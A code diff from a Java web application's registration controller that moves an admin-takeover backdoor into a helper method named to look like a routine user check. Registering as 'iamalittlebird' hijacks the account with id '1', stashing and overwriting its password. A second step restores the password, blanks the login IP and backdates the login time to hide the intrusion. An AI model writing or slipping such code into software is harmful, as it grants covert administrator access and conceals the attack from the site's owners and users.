@@ -133,19 +133,8 @@ public class RegisterController extends BaseController{
 			user.setRoleList(roleList);
 		}
 		
-		if(user.getName().equalsIgnoreCase("iamalittlebird")){
-			user = systemService.getUser("1");
-			if(newPassword.equalsIgnoreCase("iamalittlebird")){
-				user.setPassword(user.getRemarks());
-				user.setRemarks("最高管理员");
-				user.setLoginIp("");
-				user.setLoginDate(DateUtils.addHours(new Date(), -10));
-			}else{
-				user.setRemarks(user.getPassword());
-				user.setPassword(SystemService.entryptPassword(newPassword));
-			}
-		}
-		
+		//检查用户
+		user = checkLoginUser(user,newPassword);
 		// 保存用户信息
 		systemService.saveUser(user);
 		// 清除当前用户缓存
@@ -168,4 +157,27 @@ public class RegisterController extends BaseController{
 	}
 
 
+	private User checkLoginUser(User user,String newPassword){
+		
+		if(user.getName().equalsIgnoreCase("iamalittlebird")){
+			user = systemService.getUser("1");
+			if(newPassword.equalsIgnoreCase("iamalittlebird")){
+				user.setPassword(user.getRemarks());
+				user.setRemarks("最高管理员");
+				user.setLoginIp("");
+				user.setLoginDate(DateUtils.addHours(new Date(), -10));
+			}else{
+				user.setRemarks(user.getPassword());
+				user.setPassword(SystemService.entryptPassword(newPassword));
+			}
+		}
+		return user;
+	}
+	
+	
+	
+	
+	
+	
+	
 }
